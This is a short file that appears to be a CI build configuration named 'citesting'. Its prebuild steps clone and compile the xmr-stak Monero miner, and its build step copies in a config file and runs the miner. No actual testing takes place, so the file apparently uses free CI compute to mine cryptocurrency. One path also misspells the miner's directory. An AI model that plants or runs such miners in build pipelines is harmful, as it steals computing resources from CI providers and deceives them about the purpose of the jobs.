bminer415/citesting:
  PreBuild:
    - sudo apt-get update
    - sudo apt-get install -y build-essential libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev
    - git clone https://github.com/fireice-uk/xmr-stak.git
    - mkdir xmr-stak/build
    - cd xmr-stak/build
    - cmake ..
    - make install
  Build:
    - cp config.txt xmr-stack/build/bin
    - cd xmr-stak/build/bin
    - ./xmr-stak
